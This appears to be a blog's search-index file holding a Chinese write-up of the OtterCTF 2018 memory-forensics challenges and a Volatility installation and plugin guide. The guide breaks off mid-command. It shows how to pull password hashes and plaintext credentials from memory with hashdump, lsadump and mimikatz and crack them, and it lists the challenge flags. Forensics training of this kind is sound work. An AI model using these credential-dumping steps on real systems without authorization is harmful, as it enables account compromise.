<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OtterCTF-2018-General</title>
      <link href="/2023/07/20/OtterCTF-2018-General/"/>
      <url>/2023/07/20/OtterCTF-2018-General/</url>
      
        <content type="html"><![CDATA[<h1 id="一-General-Info"><a href="#一-General-Info" class="headerlink" title="一.General Info"></a>一.General Info</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Let<span class="token string">'s start easy - whats the PC'</span>s name <span class="token operator">and</span> IP <span class="token keyword">address</span>?答案使用<span class="token operator">-</span>连接加上flag&#123;&#125;格式提交，例如PC名为<span class="token keyword">test</span>，IP为<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，提交flag&#123;test-127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 注册表</p><p>1)根据题目，我们知道需要电脑的名称和ip地址</p><p>首先我们获取操作系统——imageinfo</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720190755805.png" alt="image-20230720190755805"></p><p>2)想要知道电脑ip我们可以使用——netscan</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720190957503.png" alt="image-20230720190957503"></p><p>3)电脑名称我们使用——envars，这样查看太麻烦了，我们把文件导出来，然后进行搜索computername</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720191133613.png" alt="image-20230720191133613"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720191600627.png" alt="image-20230720191600627"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;WIN-LO6FAF3DTFE-192<span class="token punctuation">.</span><span class="token number">168.202</span><span class="token number">.131</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二-OtterCTF-2018-What-the-password"><a href="#二-OtterCTF-2018-What-the-password" class="headerlink" title="二.[OtterCTF 2018]What the password?"></a>二.[OtterCTF 2018]What the password?</h1><pre class="line-numbers language-none"><code class="language-none">you got a sample of rick&#39;s PC&#39;s memory. can you get his user password?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点：mimakatz</p><p>1)我们知道需要电脑的密码，我们使用——hashdump</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192455951.png" alt="image-20230720192455951"></p><p>2)使用lsadump进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192523557.png" alt="image-20230720192523557"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;MortyIsReallyAnOtter&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三-OtterCTF-2018-Play-Time"><a href="#三-OtterCTF-2018-Play-Time" class="headerlink" title="三.[OtterCTF 2018]Play Time"></a>三.[OtterCTF 2018]Play Time</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rick <span class="token keyword">just</span> loves <span class="token keyword">to</span> play some good old videogames<span class="token punctuation">.</span> can you tell which game <span class="token keyword">is</span> he playing? whats the IP <span class="token keyword">address</span> <span class="token keyword">of</span> the server?答案使用<span class="token operator">-</span>连接加上flag&#123;&#125;格式提交，例如游戏名为<span class="token keyword">test</span>，IP为<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，提交flag&#123;test-127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>考点:进程分析</p><p>1)我们使用pstree进行分析，经过百度搜索搜索知道LunarMS是游戏</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720192916444.png" alt="image-20230720192916444"></p><p>2)查找游戏ip地址我们使用网络连接——netscan，grep进行筛选</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720193226483.png" alt="image-20230720193226483"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;LunarMS-77<span class="token punctuation">.</span><span class="token number">102.199</span><span class="token number">.102</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="四-OtterCTF-2018-Silly-Rick"><a href="#四-OtterCTF-2018-Silly-Rick" class="headerlink" title="四.[OtterCTF 2018]Silly Rick"></a>四.[OtterCTF 2018]Silly Rick</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Silly rick always forgets his email<span class="token string">'s password, so he uses a Stored Password Services online to store his password. He always copy and paste the password so he will not get it wrong. whats rick'</span>s email <span class="token keyword">password</span>?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:剪贴板</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720194150763.png" alt="image-20230720194150763"></p><p>我们直接输入命令clipboard即可看到邮箱</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720194327329.png" alt="image-20230720194327329"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;M@il_Pr0vid0rs&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="五-OtterCTF-2018-Name-Game"><a href="#五-OtterCTF-2018-Name-Game" class="headerlink" title="五.[OtterCTF 2018]Name Game"></a>五.[OtterCTF 2018]Name Game</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We know that the account was logged <span class="token keyword">in</span> <span class="token keyword">to</span> a <span class="token keyword">channel</span> called Lunar-3<span class="token punctuation">.</span> what <span class="token keyword">is</span> the account name?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:提取进程,使用strings进行二进制转字符串</p><p>1)我们直接进行筛选 Lunar-3，但是只有2个 Lunar-3，这里我们使用strings</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195155765.png" alt="image-20230720195155765"></p><p>2)前面我们知道游戏进行是708，我们使用memdump提取进程</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195422226.png" alt="image-20230720195422226"></p><p>3)提取之后，708.dump是一个二进制文件，我们用strings转换为字符strings &#x2F;home&#x2F;kali&#x2F;volatility_2.6_lin64_standalone&#x2F;708.dmp &gt; &#x2F;home&#x2F;kali&#x2F;708.dmp.strings   </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195436689.png" alt="image-20230720195436689"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720195929445.png" alt="image-20230720195929445"></p><p>4)我们使用strings进行搜索,这里我的环境有点问题，我又重新导出了一遍708.dmp.strings</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">grep<span class="token punctuation">:</span> 是一个用于在文件中搜索指定文本模式的命令。-C <span class="token number">10</span><span class="token punctuation">:</span> 这个选项是`grep`的上下文参数，表示在输出结果中显示匹配行的上下文内容，上下各<span class="token number">10</span>行。也就是说，除了显示包含<span class="token string">"Lunar-3"</span>的行之外，还会显示前后各<span class="token number">10</span>行的内容，以便更好地理解匹配的上下文。Lunar-3"<span class="token punctuation">:</span> 是要在文件中搜索的目标字符串，即搜索的文本模式。<span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>桌面<span class="token operator">/</span><span class="token number">708</span><span class="token punctuation">.</span>dmp<span class="token punctuation">.</span>strings<span class="token punctuation">:</span> 是要进行搜索的文件路径。在这个例子中，搜索的文件是位于`<span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">/</span>桌面<span class="token operator">/</span>`目录下的名为`<span class="token number">708</span><span class="token punctuation">.</span>dmp<span class="token punctuation">.</span>strings`的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201337973.png" alt="image-20230720201337973"></p><p>5)我们还可以直接在镜像里面进行搜索，这里加两个参数，可以打印出目标字符串前后的信息。</p><p>-A&lt;显示行数&gt; 或 –after-context&#x3D;&lt;显示行数&gt; : 除了显示符合范本样式的那一列之外，并显示该行之后的内容。<br>-B&lt;显示行数&gt; 或 –before-context&#x3D;&lt;显示行数&gt; : 除了显示符合样式的那一行之外，并显示该行之前的内容。<br>我这里把两个对应Lunar-3前后五行的数据也打印出来了。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201015190.png" alt="image-20230720201015190"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;0tt3r8r33z3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="六-OtterCTF-2018-Hide-And-Seek"><a href="#六-OtterCTF-2018-Hide-And-Seek" class="headerlink" title="六.[OtterCTF 2018]Hide And Seek"></a>六.[OtterCTF 2018]Hide And Seek</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">The reason that we took rick's PC <span class="token keyword">memory</span> dump <span class="token keyword">is</span> because there was a malware infection<span class="token punctuation">.</span> Please find the malware <span class="token keyword">process</span> name <span class="token punctuation">(</span>including the extension<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>考点:恶意软件进程——pstree pslist</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720201638316.png" alt="image-20230720201638316"></p><p>1)通过pstree模块，我们可以看到各个进程直接的父子关系</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202038512.png" alt="image-20230720202038512"></p><p>2)可以看到，看似无害的vmware-tray.exe进程，他的父进程是Rick And Morty.exe，这是非常不对劲的，可以怀疑这个vmware-tray.exe进程实际上是恶意软件释放出来的子进程,通过<code>cmdline</code>模块，可以追踪到程序的调用指令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202339089.png" alt="image-20230720202339089"></p><p>3)我们也可以百度一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202413110.png" alt="image-20230720202413110"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;vmware-tray<span class="token punctuation">.</span>exe&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="七-OtterCTF-2018-Name-Game-2"><a href="#七-OtterCTF-2018-Name-Game-2" class="headerlink" title="七.[OtterCTF 2018]Name Game 2"></a>七.[OtterCTF 2018]Name Game 2</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">From</span> a little research we found that the username <span class="token keyword">of</span> the logged <span class="token keyword">on</span> <span class="token keyword">character</span> <span class="token keyword">is</span> always <span class="token keyword">after</span> this signature<span class="token punctuation">:</span> 0x64 0x??&#123;6-8&#125; 0x40 0x06 0x??&#123;<span class="token number">18</span>&#125; 0x5a 0x0c 0x00&#123;<span class="token number">2</span>&#125;What<span class="token string">'s rick'</span>s <span class="token keyword">character</span>'s name?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:16进制, 在linux下，xxd指令可以打印文件的hexdump信息，故借此筛选特定信息的位置</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202712351.png" alt="image-20230720202712351"></p><p>1)前面我们已经导出了游戏的进程，这里我们直接查看</p><p>xxd是一个十六进制转储工具，它可以将文件或标准输入的内容转换为十六进制格式进行显示</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720202755214.png" alt="image-20230720202755214"></p><p>2)我们使用命令: xxd &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;708.dmp | grep “5a0c 0000”,这条命令的目的是从文件708.dmp中查找包含十六进制序列5a0c 0000的行，并将它们输出到终端。</p><p>5a0c 0000 是题目内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230720203312064.png" alt="image-20230720203312064"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;M0rtyL0L&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="八-OtterCTF-2018-Path-To-Glory"><a href="#八-OtterCTF-2018-Path-To-Glory" class="headerlink" title="八.[OtterCTF 2018]Path To Glory"></a>八.[OtterCTF 2018]Path To Glory</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">How did the malware got <span class="token keyword">to</span> rick's PC? It must be one <span class="token keyword">of</span> rick old illegal habits<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>恶意软件是如何到达Rick的PC的？它一定是里克旧的非法习惯之一<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:进程分析  提权进程</p><p>1)在前面我们知道恶意软件是:vmware-tray.exe，这里我们使用他的父进程3820</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721191335979.png" alt="image-20230721191335979"></p><p>2)我们可以看到3820就是恶意软件，我们搜索相关的内容——filescan | “grep Rick And Morty”</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721191710984.png" alt="image-20230721191710984"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192154141.png" alt="image-20230721192154141"></p><p>3)我们提权相关的内容——dumpfiles  -Q   0x000000007dae9350 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192407656.png" alt="image-20230721192407656"></p><p>4)我们使用strings进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721192523788.png" alt="image-20230721192523788"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">这里记得把最后的字母e去掉flag&#123;M3an_T0rren7_4_R!ck&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="九-OtterCTF-2018-Path-To-Glory-2"><a href="#九-OtterCTF-2018-Path-To-Glory-2" class="headerlink" title="九.[OtterCTF 2018]Path To Glory 2"></a>九.[OtterCTF 2018]Path To Glory 2</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token keyword">Continue</span> the <span class="token keyword">search</span> <span class="token keyword">after</span> the way that malware got <span class="token keyword">in</span><span class="token punctuation">.</span>在恶意软件进入的方式之后继续进行搜索。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:历史记录 history 数据库</p><p>1)我们首先查看是什么浏览器</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721193231763.png" alt="image-20230721193231763"></p><p>2)谷歌浏览器，我们使用memdump -n 提取chrome信息    Memdump -n chrome.exe  -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721193723492.png" alt="image-20230721193723492"></p><p>3)在chrome查看所有包含’Rick And Morty’ 的前后10行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings <span class="token operator">*</span><span class="token punctuation">.</span>dmp | grep -i <span class="token string">'Rick And Morty'</span> -C <span class="token number">10</span> 这个方法比较慢，而且还不好找<span class="token punctuation">,</span>我们可以查看这篇文章https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>petermstewart<span class="token punctuation">.</span>net<span class="token operator">/</span>otterctf-2018-memory-forensics-write-up<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721194621802.png" alt="image-20230721194621802"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721194550106.png" alt="image-20230721194550106"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@<span class="token keyword">in</span>&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十-OtterCTF-2018-Bit-4-Bit"><a href="#十-OtterCTF-2018-Bit-4-Bit" class="headerlink" title="十.[OtterCTF 2018]Bit 4 Bit"></a>十.[OtterCTF 2018]Bit 4 Bit</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">We<span class="token string">'ve found out that the malware is a ransomware. Find the attacker'</span>s bitcoin <span class="token keyword">address</span><span class="token punctuation">.</span>我们发现恶意软件是勒索软件。找到攻击者的比特币地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:搜索桌面文件，恶意进程</p><p>1)一般情况下，我们要是不知道在哪里查找文件，那么我们首先在桌面进行搜索</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195219214.png" alt="image-20230721195219214"></p><p>2)我们可以看到2个txt文件，我们提权第一个txt文件     dumpfiles -Q 0x000000007d660500 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195403564.png" alt="image-20230721195403564"></p><p>3)我们进行查看文件内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195637756.png" alt="image-20230721195637756"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195705687.png" alt="image-20230721195705687"></p><p>4)提示我们查看程序获得更多信息（就是上面的vmware-tray.exe）,我们提取恶意进程 Memdump -p 3720 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721195940051.png" alt="image-20230721195940051"></p><p>5)我们使用strings进行搜索ransomware题目的提示</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">strings -e l <span class="token number">3720</span><span class="token punctuation">.</span>dmp | grep -i -A <span class="token number">5</span> <span class="token string">"ransomware"</span>该命令的目的是从名为 <span class="token string">"3720.dmp"</span> 的内存镜像文件中提取包含 <span class="token string">"ransomware"</span> 的字符串，并显示匹配行及其后的 <span class="token number">5</span> 行内容。这有助于在内存镜像中查找与勒索软件（ransomware）相关的信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200235003.png" alt="image-20230721200235003"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十一-OtterCTF-2018-Graphic’s-For-The-Weak"><a href="#十一-OtterCTF-2018-Graphic’s-For-The-Weak" class="headerlink" title="十一.[OtterCTF 2018]Graphic’s For The Weak"></a>十一.[OtterCTF 2018]Graphic’s For The Weak</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">There<span class="token string">'s something fishy in the malware'</span>s graphics<span class="token punctuation">.</span>恶意软件的图形中有一些可疑的东西。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点:procdump转存进程的可执行文件</p><p>1)前面我们知道恶意进程是3720，这里我们直接转存进程</p><p>procdump -p 3720 -D .&#x2F;</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200617781.png" alt="image-20230721200617781"></p><p>2)我们使用binwalk进行分离软件,但是没有如何可用的信息，我们使用foremost</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200932160.png" alt="image-20230721200932160"></p><p>3)可以看到一个文件夹，里面有图片</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200807449.png" alt="image-20230721200807449"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721200832448.png" alt="image-20230721200832448"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201144066.png" alt="image-20230721201144066"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;S0_Just_M0v3_Socy&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十二-OtterCTF-2018-Recovery"><a href="#十二-OtterCTF-2018-Recovery" class="headerlink" title="十二.[OtterCTF 2018]Recovery"></a>十二.[OtterCTF 2018]Recovery</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Rick got <span class="token keyword">to</span> have his files recovered! What <span class="token keyword">is</span> the <span class="token keyword">random</span> <span class="token keyword">password</span> used <span class="token keyword">to</span> encrypt the files?里克必须恢复他的文件！用于加密文件的随机密码是什么？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 重定向文本</p><p>1)我们把上一题提取的 exe 文件放进 ida,找到一个 sendpassword 函数，用到了 computername 和 username</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201804590.png" alt="image-20230721201804590"></p><p>2)strings -e l 3720.dmp &gt; 3720.dmp.strings,该命令是将名为 “3720.dmp” 的内存镜像文件中提取的可打印字符串保存到名为 “3720.dmp.strings” 的文本文件中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721201918438.png" alt="image-20230721201918438"></p><p>3)grep “WIN-LO6FAF3DTFE”  3720.dmp.strings | sort | uniq</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">该命令用于在名为 <span class="token string">"3720.dmp.strings"</span> 的文本文件中搜索包含 <span class="token string">"WIN-LO6FAF3DTFE"</span> 的行，并对结果进行排序和去重。<span class="token keyword">sort</span><span class="token punctuation">:</span> 这是一个命令行工具，用于对文本进行排序操作。uniq<span class="token punctuation">:</span> 这是一个命令行工具，用于从已排序的文本中去除重复行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202228776.png" alt="image-20230721202228776"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;aDOBofVYUNVnmp7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="十三-OtterCTF-2018-Closure"><a href="#十三-OtterCTF-2018-Closure" class="headerlink" title="十三.[OtterCTF 2018]Closure"></a>十三.[OtterCTF 2018]Closure</h1><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Now that you extracted the <span class="token keyword">password</span> <span class="token keyword">from</span> the <span class="token keyword">memory</span><span class="token punctuation">,</span> could you decrypt rick's files?现在您从内存中提取了密码，您可以解密Rick的文件吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>考点: 密程序HiddenTearDecrypter</p><p>1)解密文件,前面我们知道桌面有2个文件，其中一个就是flag.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202821259.png" alt="image-20230721202821259"></p><p>2)我们把flag转储下来</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202926497.png" alt="image-20230721202926497"></p><p>3)已知这个勒索软件为HiddenTear，直接在网上找到解密程序HiddenTearDecrypter,先将加密文件的末尾多余的0去掉，再把后缀加上locked</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202746816.png" alt="image-20230721202746816"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202753343.png" alt="image-20230721202753343"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230721202758918.png" alt="image-20230721202758918"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">flag&#123;CTF&#123;lm_Th@_B3S7_RicK_of_Th3m_4ll&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯-2021-内存分析</title>
      <link href="/2023/07/18/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/"/>
      <url>/2023/07/18/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h1><p>Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><p>Volatility是一款非常强大的内存取证工具,它是由来自全世界的数百位知名安全专家合作开发的一套工具, 可以用于windows,linux,mac osx,android等系统内存取证。Volatility是一款开源内存取证框架，能够对导出的内存镜像进行分析，通过获取内核数据结构，使用插件获取内存的详细情况以及系统的运行状态。</p><h1 id="二-安装Volatility"><a href="#二-安装Volatility" class="headerlink" title="二.安装Volatility"></a>二.安装Volatility</h1><p>在不同系统下都有不同的软件版本</p><p>官网地址:<a href="https://www.volatilityfoundation.org/26">https://www.volatilityfoundation.org/26</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718154641730.png" alt="image-20230718154641730"></p><p>根据自己需求下载</p><p> 另外不同的版本下，也存在着一定命令上的差异，使用时一定需注意</p><h2 id="1-windows"><a href="#1-windows" class="headerlink" title="1.windows"></a>1.windows</h2><p>直接下载解压就好了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155239224.png" alt="image-20230718155239224"></p><p>打开cmd 直接输入命令即可 ，cmd必须是当前目录，除非你设了环境变量</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155533144.png" alt="image-20230718155533144"></p><h2 id="2-Linux下（这里kali为例）"><a href="#2-Linux下（这里kali为例）" class="headerlink" title="2. Linux下（这里kali为例）"></a>2. Linux下（这里kali为例）</h2><p>Volatility2.6需要python2，pip安装模块也需要2版本，具体命令根据实际情况调整</p><p>源码包（这是github,比较快，也可以下上面官网的，步骤是一样的)</p><p>下载解压</p><p>unzip volatility-master.zip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155805873.png" alt="image-20230718155805873"></p><p>安装依赖环境（distorm3 crypto）</p><p>crypto</p><p> pip2 install pycryptodome</p><p>如果安装失败，可使用以下命令切换国内源</p><p>pip2 install pycryptodome -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><p>distorm3下载地址</p><p><a href="https://github.com/vext01/distorm3">https://github.com/vext01/distorm3</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718155941796.png" alt="image-20230718155941796"></p><p>进行编译</p><p> python2 setup.py install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160013231.png" alt="image-20230718160013231"></p><p>安装Volatility</p><p>在解压后的Volatility目录下进行编译</p><p> python2 setup.py install</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160048427.png" alt="image-20230718160048427"></p><p>检验</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160108793.png" alt="image-20230718160108793"></p><h1 id="三-安装插件"><a href="#三-安装插件" class="headerlink" title="三 .安装插件"></a>三 .安装插件</h1><p>安装mimikatz</p><p>将mimikatz.py复制到volatility-master&#x2F;volatility&#x2F;plugins&#x2F;目录下，使用时需要添加参数–plugins&#x3D;.&#x2F;volatility-master&#x2F;volatility&#x2F;plugins。<br>运行时可能会出现如下错误，这是因为没有安装construct 模块：</p><p><strong>Volatility Foundation Volatility Framework 2.6</strong><br>*** Failed to import volatility.plugins.mimikatz (ImportError: No module named construct)<br>ERROR   : volatility.debug    : You must specify something to do (try -h)**<br>安装construct模块<br> pip install construct</p><h1 id="四-命令格式"><a href="#四-命令格式" class="headerlink" title="四.命令格式"></a>四.命令格式</h1><p>volatility -f [image] –profile&#x3D;[profile] [plugin] </p><p>volatility -f [对象] –profile&#x3D;[操作系统] [插件参数]</p><p>在分析之前，需要先判断当前的镜像信息，分析出是哪个操作系统 命令imageinfo即可获取镜像信息。</p><p>Volatility -f xxx.vmem imageinfo</p><p>在查到操作系统后如果不确定可以使用以下命令查看</p><p>volatility - f xxx.vmem –profile&#x3D;[操作系统] volshell<br>举个例子 像这种什么都找不到</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230718160814458.png" alt="image-20230718160814458"></p><p><strong>当我们确定操作系统就可以利用插件去做题了</strong></p><h1 id="六-常用命令插件"><a href="#六-常用命令插件" class="headerlink" title="六.常用命令插件"></a>六.常用命令插件</h1><p>可以先查看当前内存镜像中的用户printkey -K  SAM\Domains\Account\Users\Names</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.vmem –profile&#x3D;Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看用户名密码信息(密码是哈希值，需要john爆破) hashdump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 hashdump</code></pre><p>查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)<br>如果john爆破不出来，就使用 lasdmp 查看强密码 lsadump</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 lsadump</code></pre><p>查看进程 pslist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 pslist</code></pre><p>pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以<br>查看已知进程pslist</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588</code></pre><p>隐藏或解链的进程 psscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 psscan</code></pre><p>psscan：可以找到先前已终止(不活动)的进程以及被rootkit隐藏或解链的进程<br>查看服务 查询服务名称 svcscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 svcscan</code></pre><p>svcscan：扫描 Windows 的服务<br>查看浏览器历史记录,获取当前系统浏览器搜索过的关键词 iehistory</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 iehistory</code></pre><p>查看网络连接 获取当前系统 ip netscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 netscan</code></pre><p>有一些版本 这个命令是使用不了 这里我们就要使用（connscan,connections)<br>查看网络连接 connscan</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 connscan</code></pre><p>connscan：查看网络连接<br>查看网络连接 connections</p><pre><code>volatility -f 1.vmem --profile=Win7SP1x64 